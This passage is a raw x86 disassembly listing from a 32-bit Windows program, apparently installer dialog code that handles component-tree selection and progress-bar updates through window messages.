  404839:	ff 75 f8             	push   -0x8(%ebp)
  40483c:	e8 42 f2 ff ff       	call   0x403a83
  404841:	e9 7b 03 00 00       	jmp    0x404bc1
  404846:	ff 75 fc             	push   -0x4(%ebp)
  404849:	e8 35 f2 ff ff       	call   0x403a83
  40484e:	33 db                	xor    %ebx,%ebx
  404850:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404857:	75 11                	jne    0x40486a
  404859:	89 5d 10             	mov    %ebx,0x10(%ebp)
  40485c:	c7 45 14 01 00 00 00 	movl   $0x1,0x14(%ebp)
  404863:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  40486a:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  40486e:	b8 13 04 00 00       	mov    $0x413,%eax
  404873:	74 09                	je     0x40487e
  404875:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404878:	0f 85 dc 00 00 00    	jne    0x40495a
  40487e:	8b 7d 14             	mov    0x14(%ebp),%edi
  404881:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404884:	74 0d                	je     0x404893
  404886:	81 7f 04 08 04 00 00 	cmpl   $0x408,0x4(%edi)
  40488d:	0f 85 c7 00 00 00    	jne    0x40495a
  404893:	f7 05 08 b3 47 00 00 	testl  $0x200,0x47b308
  40489a:	02 00 00 
  40489d:	75 79                	jne    0x404918
  40489f:	39 45 0c             	cmp    %eax,0xc(%ebp)
  4048a2:	74 09                	je     0x4048ad
  4048a4:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4048a7:	83 79 08 fe          	cmpl   $0xfffffffe,0x8(%ecx)
  4048ab:	75 6b                	jne    0x404918
  4048ad:	33 c9                	xor    %ecx,%ecx
  4048af:	39 45 0c             	cmp    %eax,0xc(%ebp)
  4048b2:	0f 95 c1             	setne  %cl
  4048b5:	51                   	push   %ecx
  4048b6:	ff 75 fc             	push   -0x4(%ebp)
  4048b9:	e8 f4 fb ff ff       	call   0x4044b2
  4048be:	3b c3                	cmp    %ebx,%eax
  4048c0:	7c 56                	jl     0x404918
  4048c2:	8b 55 e8             	mov    -0x18(%ebp),%edx
  4048c5:	8b c8                	mov    %eax,%ecx
  4048c7:	69 c9 20 40 00 00    	imul   $0x4020,%ecx,%ecx
  4048cd:	8d 54 11 08          	lea    0x8(%ecx,%edx,1),%edx
  4048d1:	8b 0a                	mov    (%edx),%ecx
  4048d3:	f6 c1 10             	test   $0x10,%cl
  4048d6:	75 40                	jne    0x404918
  4048d8:	f6 c1 40             	test   $0x40,%cl
  4048db:	74 14                	je     0x4048f1
  4048dd:	81 f1 80 00 00 00    	xor    $0x80,%ecx
  4048e3:	84 c9                	test   %cl,%cl
  4048e5:	79 05                	jns    0x4048ec
  4048e7:	83 c9 01             	or     $0x1,%ecx
  4048ea:	eb 08                	jmp    0x4048f4
  4048ec:	83 e1 fe             	and    $0xfffffffe,%ecx
  4048ef:	eb 03                	jmp    0x4048f4
  4048f1:	83 f1 01             	xor    $0x1,%ecx
  4048f4:	50                   	push   %eax
  4048f5:	89 0a                	mov    %ecx,(%edx)
  4048f7:	e8 8a c8 ff ff       	call   0x401186
  4048fc:	a1 08 b3 47 00       	mov    0x47b308,%eax
  404901:	33 c9                	xor    %ecx,%ecx
  404903:	c1 e8 08             	shr    $0x8,%eax
  404906:	41                   	inc    %ecx
  404907:	f7 d0                	not    %eax
  404909:	23 c1                	and    %ecx,%eax
  40490b:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40490e:	89 45 14             	mov    %eax,0x14(%ebp)
  404911:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404918:	3b fb                	cmp    %ebx,%edi
  40491a:	74 3e                	je     0x40495a
  40491c:	81 7f 08 3d fe ff ff 	cmpl   $0xfffffe3d,0x8(%edi)
  404923:	75 0e                	jne    0x404933
  404925:	ff 77 5c             	push   0x5c(%edi)
  404928:	53                   	push   %ebx
  404929:	68 19 04 00 00       	push   $0x419
  40492e:	ff 75 fc             	push   -0x4(%ebp)
  404931:	ff d6                	call   *%esi
  404933:	81 7f 08 39 fe ff ff 	cmpl   $0xfffffe39,0x8(%edi)
  40493a:	75 1e                	jne    0x40495a
  40493c:	8b 47 5c             	mov    0x5c(%edi),%eax
  40493f:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  404942:	69 c0 20 40 00 00    	imul   $0x4020,%eax,%eax
  404948:	83 7f 0c 02          	cmpl   $0x2,0xc(%edi)
  40494c:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  404950:	75 05                	jne    0x404957
  404952:	83 08 20             	orl    $0x20,(%eax)
  404955:	eb 03                	jmp    0x40495a
  404957:	83 20 df             	andl   $0xffffffdf,(%eax)
  40495a:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404961:	75 75                	jne    0x4049d8
  404963:	b8 f9 03 00 00       	mov    $0x3f9,%eax
  404968:	66 39 45 10          	cmp    %ax,0x10(%ebp)
  40496c:	0f 85 4f 02 00 00    	jne    0x404bc1
  404972:	8b 45 10             	mov    0x10(%ebp),%eax
  404975:	c1 e8 10             	shr    $0x10,%eax
  404978:	66 83 f8 01          	cmp    $0x1,%ax
  40497c:	0f 85 3f 02 00 00    	jne    0x404bc1
  404982:	53                   	push   %ebx
  404983:	53                   	push   %ebx
  404984:	68 47 01 00 00       	push   $0x147
  404989:	ff 75 f8             	push   -0x8(%ebp)
  40498c:	ff d6                	call   *%esi
  40498e:	83 f8 ff             	cmp    $0xffffffff,%eax
  404991:	0f 84 2a 02 00 00    	je     0x404bc1
  404997:	53                   	push   %ebx
  404998:	50                   	push   %eax
  404999:	68 50 01 00 00       	push   $0x150
  40499e:	ff 75 f8             	push   -0x8(%ebp)
  4049a1:	ff d6                	call   *%esi
  4049a3:	8b f8                	mov    %eax,%edi
  4049a5:	83 ff ff             	cmp    $0xffffffff,%edi
  4049a8:	74 08                	je     0x4049b2
  4049aa:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4049ad:	39 1c b8             	cmp    %ebx,(%eax,%edi,4)
  4049b0:	75 03                	jne    0x4049b5
  4049b2:	6a 20                	push   $0x20
  4049b4:	5f                   	pop    %edi
  4049b5:	57                   	push   %edi
  4049b6:	e8 eb c8 ff ff       	call   0x4012a6
  4049bb:	57                   	push   %edi
  4049bc:	53                   	push   %ebx
  4049bd:	68 20 04 00 00       	push   $0x420
  4049c2:	ff 75 08             	push   0x8(%ebp)
  4049c5:	ff d6                	call   *%esi
  4049c7:	c7 45 10 01 00 00 00 	movl   $0x1,0x10(%ebp)
  4049ce:	89 5d 14             	mov    %ebx,0x14(%ebp)
  4049d1:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4049d8:	81 7d 0c 00 02 00 00 	cmpl   $0x200,0xc(%ebp)
  4049df:	75 0c                	jne    0x4049ed
  4049e1:	53                   	push   %ebx
  4049e2:	53                   	push   %ebx
  4049e3:	68 00 02 00 00       	push   $0x200
  4049e8:	ff 75 fc             	push   -0x4(%ebp)
  4049eb:	ff d6                	call   *%esi
  4049ed:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  4049f4:	75 32                	jne    0x404a28
  4049f6:	a1 80 3d 44 00       	mov    0x443d80,%eax
  4049fb:	3b c3                	cmp    %ebx,%eax
  4049fd:	74 07                	je     0x404a06
  4049ff:	50                   	push   %eax
  404a00:	ff 15 2c 80 40 00    	call   *0x40802c
  404a06:	a1 84 3d 44 00       	mov    0x443d84,%eax
  404a0b:	3b c3                	cmp    %ebx,%eax
  404a0d:	74 07                	je     0x404a16
  404a0f:	50                   	push   %eax
  404a10:	ff 15 2c 81 40 00    	call   *0x40812c
  404a16:	89 1d 80 3d 44 00    	mov    %ebx,0x443d80
  404a1c:	89 1d 84 3d 44 00    	mov    %ebx,0x443d84
  404a22:	89 1d 10 b3 47 00    	mov    %ebx,0x47b310
  404a28:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404a2f:	0f 85 4b 01 00 00    	jne    0x404b80
  404a35:	53                   	push   %ebx
  404a36:	53                   	push   %ebx
  404a37:	e8 bc c7 ff ff       	call   0x4011f8
  404a3c:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  404a3f:	74 07                	je     0x404a48
  404a41:	6a 08                	push   $0x8
  404a43:	e8 d5 c9 ff ff       	call   0x40141d
  404a48:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  404a4b:	74 3f                	je     0x404a8c
  404a4d:	ff 35 84 3d 44 00    	push   0x443d84
  404a53:	e8 99 c8 ff ff       	call   0x4012f1
  404a58:	8b f8                	mov    %eax,%edi
  404a5a:	57                   	push   %edi
  404a5b:	e8 46 c8 ff ff       	call   0x4012a6
  404a60:	33 c0                	xor    %eax,%eax
  404a62:	33 c9                	xor    %ecx,%ecx
  404a64:	3b fb                	cmp    %ebx,%edi
  404a66:	7e 0e                	jle    0x404a76
  404a68:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  404a6b:	39 1c 82             	cmp    %ebx,(%edx,%eax,4)
  404a6e:	74 01                	je     0x404a71
  404a70:	41                   	inc    %ecx
  404a71:	40                   	inc    %eax
  404a72:	3b c7                	cmp    %edi,%eax
  404a74:	7c f2                	jl     0x404a68
  404a76:	53                   	push   %ebx
  404a77:	51                   	push   %ecx
  404a78:	68 4e 01 00 00       	push   $0x14e
  404a7d:	ff 75 f8             	push   -0x8(%ebp)
  404a80:	ff d6                	call   *%esi
  404a82:	89 7d 14             	mov    %edi,0x14(%ebp)
  404a85:	c7 45 0c 20 04 00 00 	movl   $0x420,0xc(%ebp)
  404a8c:	53                   	push   %ebx
  404a8d:	53                   	push   %ebx
  404a8e:	e8 65 c7 ff ff       	call   0x4011f8
  404a93:	39 1d cc b2 47 00    	cmp    %ebx,0x47b2cc
  404a99:	a1 84 3d 44 00       	mov    0x443d84,%eax
  404a9e:	89 45 e0             	mov    %eax,-0x20(%ebp)
  404aa1:	a1 c8 b2 47 00       	mov    0x47b2c8,%eax
  404aa6:	c7 45 c4 30 f0 00 00 	movl   $0xf030,-0x3c(%ebp)
  404aad:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  404ab0:	0f 8e a1 00 00 00    	jle    0x404b57
  404ab6:	8d 78 08             	lea    0x8(%eax),%edi
  404ab9:	8b 45 e0             	mov    -0x20(%ebp),%eax
  404abc:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  404abf:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  404ac2:	3b c3                	cmp    %ebx,%eax
  404ac4:	74 79                	je     0x404b3f
  404ac6:	8b 0f                	mov    (%edi),%ecx
  404ac8:	89 45 bc             	mov    %eax,-0x44(%ebp)
  404acb:	c7 45 b8 08 00 00 00 	movl   $0x8,-0x48(%ebp)
  404ad2:	f7 c1 00 01 00 00    	test   $0x100,%ecx
  404ad8:	74 13                	je     0x404aed
  404ada:	8d 47 10             	lea    0x10(%edi),%eax
  404add:	c7 45 b8 09 00 00 00 	movl   $0x9,-0x48(%ebp)
  404ae4:	89 45 c8             	mov    %eax,-0x38(%ebp)
  404ae7:	81 27 ff fe ff ff    	andl   $0xfffffeff,(%edi)
  404aed:	f6 c1 40             	test   $0x40,%cl
  404af0:	74 05                	je     0x404af7
  404af2:	6a 03                	push   $0x3
  404af4:	58                   	pop    %eax
  404af5:	eb 0e                	jmp    0x404b05
  404af7:	8b c1                	mov    %ecx,%eax
  404af9:	83 e0 01             	and    $0x1,%eax
  404afc:	40                   	inc    %eax
  404afd:	f6 c1 10             	test   $0x10,%cl
  404b00:	74 03                	je     0x404b05
  404b02:	83 c0 03             	add    $0x3,%eax
  404b05:	ff 75 bc             	push   -0x44(%ebp)
  404b08:	8b d1                	mov    %ecx,%edx
  404b0a:	c1 e0 0b             	shl    $0xb,%eax
  404b0d:	83 e2 08             	and    $0x8,%edx
  404b10:	0b c2                	or     %edx,%eax
  404b12:	8b d1                	mov    %ecx,%edx
  404b14:	c1 f9 05             	sar    $0x5,%ecx
  404b17:	03 c0                	add    %eax,%eax
  404b19:	83 e2 20             	and    $0x20,%edx
  404b1c:	0b c2                	or     %edx,%eax
  404b1e:	83 e1 01             	and    $0x1,%ecx
  404b21:	41                   	inc    %ecx
  404b22:	51                   	push   %ecx
  404b23:	68 02 11 00 00       	push   $0x1102
  404b28:	ff 75 fc             	push   -0x4(%ebp)
  404b2b:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404b2e:	ff d6                	call   *%esi
  404b30:	8d 45 b8             	lea    -0x48(%ebp),%eax
  404b33:	50                   	push   %eax
  404b34:	53                   	push   %ebx
  404b35:	68 3f 11 00 00       	push   $0x113f
  404b3a:	ff 75 fc             	push   -0x4(%ebp)
  404b3d:	ff d6                	call   *%esi
  404b3f:	ff 45 e8             	incl   -0x18(%ebp)
  404b42:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404b45:	81 c7 20 40 00 00    	add    $0x4020,%edi
  404b4b:	3b 05 cc b2 47 00    	cmp    0x47b2cc,%eax
  404b51:	0f 8c 62 ff ff ff    	jl     0x404ab9
  404b57:	6a 01                	push   $0x1
  404b59:	53                   	push   %ebx
  404b5a:	ff 75 fc             	push   -0x4(%ebp)
  404b5d:	ff 15 74 82 40 00    	call   *0x408274
  404b63:	a1 88 32 47 00       	mov    0x473288,%eax
  404b68:	39 58 10             	cmp    %ebx,0x10(%eax)
  404b6b:	74 13                	je     0x404b80
  404b6d:	6a 05                	push   $0x5
  404b6f:	e8 cb f5 ff ff       	call   0x40413f
  404b74:	6a fb                	push   $0xfffffffb
  404b76:	68 ff 03 00 00       	push   $0x3ff
  404b7b:	e8 f6 f4 ff ff       	call   0x404076
  404b80:	81 7d 0c 20 04 00 00 	cmpl   $0x420,0xc(%ebp)
  404b87:	75 38                	jne    0x404bc1
  404b89:	f7 05 08 b3 47 00 00 	testl  $0x100,0x47b308
  404b90:	01 00 00 
  404b93:	74 2c                	je     0x404bc1
  404b95:	8b 35 34 82 40 00    	mov    0x408234,%esi
  404b9b:	33 c0                	xor    %eax,%eax
  404b9d:	83 7d 14 20          	cmpl   $0x20,0x14(%ebp)
  404ba1:	0f 94 c0             	sete   %al
  404ba4:	c1 e0 03             	shl    $0x3,%eax
  404ba7:	8b f8                	mov    %eax,%edi
  404ba9:	57                   	push   %edi
  404baa:	ff 75 fc             	push   -0x4(%ebp)
  404bad:	ff d6                	call   *%esi
  404baf:	57                   	push   %edi
  404bb0:	68 fe 03 00 00       	push   $0x3fe
  404bb5:	ff 75 08             	push   0x8(%ebp)
  404bb8:	ff 15 60 82 40 00    	call   *0x408260
  404bbe:	50                   	push   %eax
  404bbf:	ff d6                	call   *%esi
  404bc1:	ff 75 14             	push   0x14(%ebp)
  404bc4:	8b 45 0c             	mov    0xc(%ebp),%eax
  404bc7:	ff 75 10             	push   0x10(%ebp)
  404bca:	e8 e6 ee ff ff       	call   0x403ab5
  404bcf:	5f                   	pop    %edi
  404bd0:	5e                   	pop    %esi
  404bd1:	5b                   	pop    %ebx
  404bd2:	c9                   	leave
  404bd3:	c2 10 00             	ret    $0x10
  404bd6:	55                   	push   %ebp
  404bd7:	8b ec                	mov    %esp,%ebp
  404bd9:	83 ec 44             	sub    $0x44,%esp
  404bdc:	a1 6c 32 47 00       	mov    0x47326c,%eax
  404be1:	57                   	push   %edi
  404be2:	33 ff                	xor    %edi,%edi
  404be4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404be7:	3b c7                	cmp    %edi,%eax
  404be9:	0f 84 b7 00 00 00    	je     0x404ca6
  404bef:	53                   	push   %ebx
  404bf0:	8b 1d 94 b3 47 00    	mov    0x47b394,%ebx
  404bf6:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  404bf9:	83 e3 01             	and    $0x1,%ebx
  404bfc:	56                   	push   %esi
  404bfd:	be 98 7d 44 00       	mov    $0x447d98,%esi
  404c02:	75 09                	jne    0x404c0d
  404c04:	ff 75 08             	push   0x8(%ebp)
  404c07:	56                   	push   %esi
  404c08:	e8 20 16 00 00       	call   0x40622d
  404c0d:	56                   	push   %esi
  404c0e:	e8 1e 10 00 00       	call   0x405c31
  404c13:	89 45 08             	mov    %eax,0x8(%ebp)
  404c16:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  404c19:	74 1b                	je     0x404c36
  404c1b:	ff 75 0c             	push   0xc(%ebp)
  404c1e:	e8 0e 10 00 00       	call   0x405c31
  404c23:	03 45 08             	add    0x8(%ebp),%eax
  404c26:	3d 10 80 00 00       	cmp    $0x8010,%eax
  404c2b:	73 77                	jae    0x404ca4
  404c2d:	ff 75 0c             	push   0xc(%ebp)
  404c30:	56                   	push   %esi
  404c31:	e8 01 10 00 00       	call   0x405c37
  404c36:	f6 45 f8 04          	testb  $0x4,-0x8(%ebp)
  404c3a:	75 0d                	jne    0x404c49
  404c3c:	56                   	push   %esi
  404c3d:	ff 35 78 32 47 00    	push   0x473278
  404c43:	ff 15 28 82 40 00    	call   *0x408228
  404c49:	f6 45 f8 02          	testb  $0x2,-0x8(%ebp)
  404c4d:	75 44                	jne    0x404c93
  404c4f:	57                   	push   %edi
  404c50:	57                   	push   %edi
  404c51:	68 04 10 00 00       	push   $0x1004
  404c56:	ff 75 fc             	push   -0x4(%ebp)
  404c59:	89 75 d0             	mov    %esi,-0x30(%ebp)
  404c5c:	8b 35 78 82 40 00    	mov    0x408278,%esi
  404c62:	c7 45 bc 01 00 00 00 	movl   $0x1,-0x44(%ebp)
  404c69:	ff d6                	call   *%esi
  404c6b:	2b c3                	sub    %ebx,%eax
  404c6d:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404c70:	8d 45 bc             	lea    -0x44(%ebp),%eax
  404c73:	50                   	push   %eax
  404c74:	57                   	push   %edi
  404c75:	b8 4d 10 00 00       	mov    $0x104d,%eax
  404c7a:	2b c3                	sub    %ebx,%eax
  404c7c:	50                   	push   %eax
  404c7d:	ff 75 fc             	push   -0x4(%ebp)
  404c80:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  404c83:	ff d6                	call   *%esi
  404c85:	57                   	push   %edi
  404c86:	ff 75 c0             	push   -0x40(%ebp)
  404c89:	68 13 10 00 00       	push   $0x1013
  404c8e:	ff 75 fc             	push   -0x4(%ebp)
  404c91:	ff d6                	call   *%esi
  404c93:	3b df                	cmp    %edi,%ebx
  404c95:	74 0d                	je     0x404ca4
  404c97:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404c9a:	33 c0                	xor    %eax,%eax
  404c9c:	66 89 04 4d 98 7d 44 	mov    %ax,0x447d98(,%ecx,2)
  404ca3:	00 
  404ca4:	5e                   	pop    %esi
  404ca5:	5b                   	pop    %ebx
  404ca6:	5f                   	pop    %edi
  404ca7:	c9                   	leave
  404ca8:	c2 08 00             	ret    $0x8
  404cab:	56                   	push   %esi
  404cac:	8b 35 c8 b2 47 00    	mov    0x47b2c8,%esi
  404cb2:	57                   	push   %edi
  404cb3:	8b 3d cc b2 47 00    	mov    0x47b2cc,%edi
  404cb9:	6a 00                	push   $0x0
  404cbb:	ff 15 b0 82 40 00    	call   *0x4082b0
  404cc1:	09 05 98 b3 47 00    	or     %eax,0x47b398
  404cc7:	6a 00                	push   $0x0
  404cc9:	e8 cc ed ff ff       	call   0x403a9a
  404cce:	85 ff                	test   %edi,%edi
  404cd0:	74 2b                	je     0x404cfd
  404cd2:	83 c6 0c             	add    $0xc,%esi
  404cd5:	4f                   	dec    %edi
  404cd6:	f6 46 fc 01          	testb  $0x1,-0x4(%esi)
  404cda:	74 0f                	je     0x404ceb
  404cdc:	ff 74 24 0c          	push   0xc(%esp)
  404ce0:	ff 36                	push   (%esi)
  404ce2:	e8 b4 c6 ff ff       	call   0x40139b
  404ce7:	85 c0                	test   %eax,%eax
  404ce9:	75 0c                	jne    0x404cf7
  404ceb:	81 c6 20 40 00 00    	add    $0x4020,%esi
  404cf1:	85 ff                	test   %edi,%edi
  404cf3:	75 e0                	jne    0x404cd5
  404cf5:	eb 06                	jmp    0x404cfd
  404cf7:	ff 05 6c b3 47 00    	incl   0x47b36c
  404cfd:	68 04 04 00 00       	push   $0x404
  404d02:	e8 93 ed ff ff       	call   0x403a9a
  404d07:	ff 15 b4 82 40 00    	call   *0x4082b4
  404d0d:	a1 6c b3 47 00       	mov    0x47b36c,%eax
  404d12:	5f                   	pop    %edi
  404d13:	5e                   	pop    %esi
  404d14:	c2 04 00             	ret    $0x4
  404d17:	55                   	push   %ebp
  404d18:	8b ec                	mov    %esp,%ebp
  404d1a:	83 ec 54             	sub    $0x54,%esp
  404d1d:	53                   	push   %ebx
  404d1e:	56                   	push   %esi
  404d1f:	8b 35 6c 32 47 00    	mov    0x47326c,%esi
  404d25:	33 db                	xor    %ebx,%ebx
  404d27:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404d2e:	57                   	push   %edi
  404d2f:	89 75 fc             	mov    %esi,-0x4(%ebp)
  404d32:	0f 85 8c 01 00 00    	jne    0x404ec4
  404d38:	83 4d c4 ff          	orl    $0xffffffff,-0x3c(%ebp)
  404d3c:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  404d40:	c7 45 bc 02 00 00 00 	movl   $0x2,-0x44(%ebp)
  404d47:	89 5d c0             	mov    %ebx,-0x40(%ebp)
  404d4a:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  404d4d:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  404d50:	33 c0                	xor    %eax,%eax
  404d52:	8d 7d d4             	lea    -0x2c(%ebp),%edi
  404d55:	ab                   	stos   %eax,%es:(%edi)
  404d56:	ab                   	stos   %eax,%es:(%edi)
  404d57:	ab                   	stos   %eax,%es:(%edi)
  404d58:	ab                   	stos   %eax,%es:(%edi)
  404d59:	ab                   	stos   %eax,%es:(%edi)
  404d5a:	a1 bc b2 47 00       	mov    0x47b2bc,%eax
  404d5f:	8b 48 5c             	mov    0x5c(%eax),%ecx
  404d62:	8b 40 60             	mov    0x60(%eax),%eax
  404d65:	8b 3d 60 82 40 00    	mov    0x408260,%edi
  404d6b:	68 03 04 00 00       	push   $0x403
  404d70:	ff 75 08             	push   0x8(%ebp)
  404d73:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  404d76:	89 45 10             	mov    %eax,0x10(%ebp)
  404d79:	ff d7                	call   *%edi
  404d7b:	68 ee 03 00 00       	push   $0x3ee
  404d80:	ff 75 08             	push   0x8(%ebp)
  404d83:	a3 80 32 47 00       	mov    %eax,0x473280
  404d88:	ff d7                	call   *%edi
  404d8a:	68 f8 03 00 00       	push   $0x3f8
  404d8f:	ff 75 08             	push   0x8(%ebp)
  404d92:	a3 78 32 47 00       	mov    %eax,0x473278
  404d97:	ff d7                	call   *%edi
  404d99:	ff 35 80 32 47 00    	push   0x473280
  404d9f:	a3 6c 32 47 00       	mov    %eax,0x47326c
  404da4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404da7:	e8 d7 ec ff ff       	call   0x403a83
  404dac:	6a 04                	push   $0x4
  404dae:	e8 8c f3 ff ff       	call   0x40413f
  404db3:	a3 84 32 47 00       	mov    %eax,0x473284
  404db8:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404dbb:	50                   	push   %eax
  404dbc:	ff 75 fc             	push   -0x4(%ebp)
  404dbf:	89 1d 8c 32 47 00    	mov    %ebx,0x47328c
  404dc5:	ff 15 84 82 40 00    	call   *0x408284
  404dcb:	6a 15                	push   $0x15
  404dcd:	ff 15 c8 81 40 00    	call   *0x4081c8
  404dd3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404dd6:	8b 35 78 82 40 00    	mov    0x408278,%esi
  404ddc:	2b c8                	sub    %eax,%ecx
  404dde:	8d 45 bc             	lea    -0x44(%ebp),%eax
  404de1:	50                   	push   %eax
  404de2:	53                   	push   %ebx
  404de3:	68 61 10 00 00       	push   $0x1061
  404de8:	ff 75 fc             	push   -0x4(%ebp)
  404deb:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  404dee:	ff d6                	call   *%esi
  404df0:	b8 00 40 00 00       	mov    $0x4000,%eax
  404df5:	50                   	push   %eax
  404df6:	50                   	push   %eax
  404df7:	68 36 10 00 00       	push   $0x1036
  404dfc:	ff 75 fc             	push   -0x4(%ebp)
  404dff:	ff d6                	call   *%esi
  404e01:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  404e04:	7c 1c                	jl     0x404e22
  404e06:	ff 75 0c             	push   0xc(%ebp)
  404e09:	53                   	push   %ebx
  404e0a:	68 01 10 00 00       	push   $0x1001
  404e0f:	ff 75 fc             	push   -0x4(%ebp)
  404e12:	ff d6                	call   *%esi
  404e14:	ff 75 0c             	push   0xc(%ebp)
  404e17:	53                   	push   %ebx
  404e18:	68 26 10 00 00       	push   $0x1026
  404e1d:	ff 75 fc             	push   -0x4(%ebp)
  404e20:	ff d6                	call   *%esi
  404e22:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  404e25:	7c 0e                	jl     0x404e35
  404e27:	ff 75 10             	push   0x10(%ebp)
  404e2a:	53                   	push   %ebx
  404e2b:	68 24 10 00 00       	push   $0x1024
  404e30:	ff 75 fc             	push   -0x4(%ebp)
  404e33:	ff d6                	call   *%esi
  404e35:	8b 45 14             	mov    0x14(%ebp),%eax
  404e38:	ff 70 30             	push   0x30(%eax)
  404e3b:	6a 1b                	push   $0x1b
  404e3d:	ff 75 08             	push   0x8(%ebp)
  404e40:	e8 e5 eb ff ff       	call   0x403a2a
  404e45:	f6 05 08 b3 47 00 03 	testb  $0x3,0x47b308
  404e4c:	74 34                	je     0x404e82
  404e4e:	53                   	push   %ebx
  404e4f:	ff 35 80 32 47 00    	push   0x473280
  404e55:	ff 15 34 82 40 00    	call   *0x408234
  404e5b:	f6 05 08 b3 47 00 02 	testb  $0x2,0x47b308
  404e62:	75 0d                	jne    0x404e71
  404e64:	6a 08                	push   $0x8
  404e66:	ff 75 fc             	push   -0x4(%ebp)
  404e69:	ff 15 34 82 40 00    	call   *0x408234
  404e6f:	eb 06                	jmp    0x404e77
  404e71:	89 1d 80 32 47 00    	mov    %ebx,0x473280
  404e77:	ff 35 78 32 47 00    	push   0x473278
  404e7d:	e8 01 ec ff ff       	call   0x403a83
  404e82:	68 ec 03 00 00       	push   $0x3ec
  404e87:	ff 75 08             	push   0x8(%ebp)
  404e8a:	ff d7                	call   *%edi
  404e8c:	68 00 00 30 75       	push   $0x75300000
  404e91:	53                   	push   %ebx
  404e92:	8b f8                	mov    %eax,%edi
  404e94:	68 01 04 00 00       	push   $0x401
  404e99:	57                   	push   %edi
  404e9a:	ff d6                	call   *%esi
  404e9c:	f6 05 08 b3 47 00 04 	testb  $0x4,0x47b308
  404ea3:	74 18                	je     0x404ebd
  404ea5:	ff 75 10             	push   0x10(%ebp)
  404ea8:	53                   	push   %ebx
  404ea9:	68 09 04 00 00       	push   $0x409
  404eae:	57                   	push   %edi
  404eaf:	ff d6                	call   *%esi
  404eb1:	ff 75 0c             	push   0xc(%ebp)
  404eb4:	53                   	push   %ebx
  404eb5:	68 01 20 00 00       	push   $0x2001
  404eba:	57                   	push   %edi
  404ebb:	ff d6                	call   *%esi
  404ebd:	33 c0                	xor    %eax,%eax
  404ebf:	e9 8f 00 00 00       	jmp    0x404f53
  404ec4:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404ecb:	75 28                	jne    0x404ef5
  404ecd:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404ed0:	50                   	push   %eax
  404ed1:	53                   	push   %ebx
  404ed2:	68 ec 03 00 00       	push   $0x3ec
  404ed7:	ff 75 08             	push   0x8(%ebp)
  404eda:	ff 15 60 82 40 00    	call   *0x408260
  404ee0:	50                   	push   %eax
  404ee1:	68 ab 4c 40 00       	push   $0x404cab
  404ee6:	53                   	push   %ebx
  404ee7:	53                   	push   %ebx
  404ee8:	ff 15 d4 80 40 00    	call   *0x4080d4
  404eee:	50                   	push   %eax
  404eef:	ff 15 bc 80 40 00    	call   *0x4080bc
  404ef5:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404efc:	8b 3d 34 82 40 00    	mov    0x408234,%edi
  404f02:	75 1f                	jne    0x404f23
  404f04:	b8 03 04 00 00       	mov    $0x403,%eax
  404f09:	66 39 45 10          	cmp    %ax,0x10(%ebp)
  404f0d:	75 36                	jne    0x404f45
  404f0f:	53                   	push   %ebx
  404f10:	ff 35 80 32 47 00    	push   0x473280
  404f16:	ff d7                	call   *%edi
  404f18:	6a 08                	push   $0x8
  404f1a:	56                   	push   %esi
  404f1b:	ff d7                	call   *%edi
  404f1d:	56                   	push   %esi
  404f1e:	e8 60 eb ff ff       	call   0x403a83
  404f23:	81 7d 0c 04 04 00 00 	cmpl   $0x404,0xc(%ebp)
  404f2a:	75 55                	jne    0x404f81
  404f2c:	39 1d 74 32 47 00    	cmp    %ebx,0x473274
  404f32:	74 26                	je     0x404f5a
  404f34:	6a 78                	push   $0x78
  404f36:	c7 05 d0 fd 45 00 02 	movl   $0x2,0x45fdd0
  404f3d:	00 00 00 
  404f40:	e8 be ea ff ff       	call   0x403a03
  404f45:	ff 75 14             	push   0x14(%ebp)
  404f48:	8b 45 0c             	mov    0xc(%ebp),%eax
  404f4b:	ff 75 10             	push   0x10(%ebp)
  404f4e:	e8 62 eb ff ff       	call   0x403ab5
  404f53:	5f                   	pop    %edi
  404f54:	5e                   	pop    %esi
  404f55:	5b                   	pop    %ebx
  404f56:	c9                   	leave
  404f57:	c2 10 00             	ret    $0x10
  404f5a:	6a 08                	push   $0x8
  404f5c:	ff 35 b4 b2 47 00    	push   0x47b2b4
